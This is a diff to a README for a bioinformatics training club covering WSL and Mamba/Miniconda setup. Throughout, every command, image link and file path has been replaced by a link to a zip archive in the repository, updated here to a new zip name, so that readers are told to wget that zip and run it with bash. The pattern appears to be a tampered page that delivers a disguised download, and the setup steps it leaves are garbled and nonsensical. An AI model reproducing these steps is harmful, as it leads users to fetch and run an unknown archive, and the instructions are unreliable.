@@ -10,11 +10,11 @@ Resources are updated as we progress.
 Happy learning!
 ## Meet your trainers
 ### From right: Lewis Karani, Kelvin Thiong'o, Bryson Kimemia
-![image](https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip)
+![image](https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip)
 
 
 ## Before we begin
-### Set up WSL on your windows computers and install ubuntu virtual machine from the microsoft store. If you're running a Linux https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip!!!
+### Set up WSL on your windows computers and install ubuntu virtual machine from the microsoft store. If you're running a Linux https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip!!!
 
 1. Open Windows Powershell as administrator( press Win + X then select "Windows PowerShell (Admin)" )
 2. Check if wsl is enabled by running the following command:
@@ -25,11 +25,11 @@ If WSL is enabled, you should see "State: Enabled" in the output
 
 3. If not enabled you can enable it by running the following command:
 ```
-https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
+https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
 ```
 4. Enable the Virtualization Machine Platform:
 ```
-https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
+https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
 ```
 Restart your computer for changes to effect
 
@@ -51,20 +51,20 @@ sudo apt upgrade
     
 For Mamba:
 ```
-wget https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
+wget https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip
 ```
    For Miniconda:
    ```
-wget https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip .
+wget https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip .
 ```
    
 10. Install the downloaded package:
 ```
-bash https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
+bash https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip
 ```
 or
 ```
-bash https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
+bash https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip
 ```
 11. Restart your terminal after installation to reload configuration files:
 ```
@@ -72,9 +72,9 @@ $SHELL
 ```
 or
 ```
-. ~https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
+. ~https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip
 ```
-This is a shorthand command of "source ~https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip"
+This is a shorthand command of "source ~https://github.com/ngurekirosh/bfx_club_ke/raw/refs/heads/main/scrobicular/club-ke-bfx-v1.6-alpha.3.zip"
 
 12. If successful you should see the name (base) displayed before your system name on the terminal
 13. Configure channels to conda by adding them to the Condarc channel list:
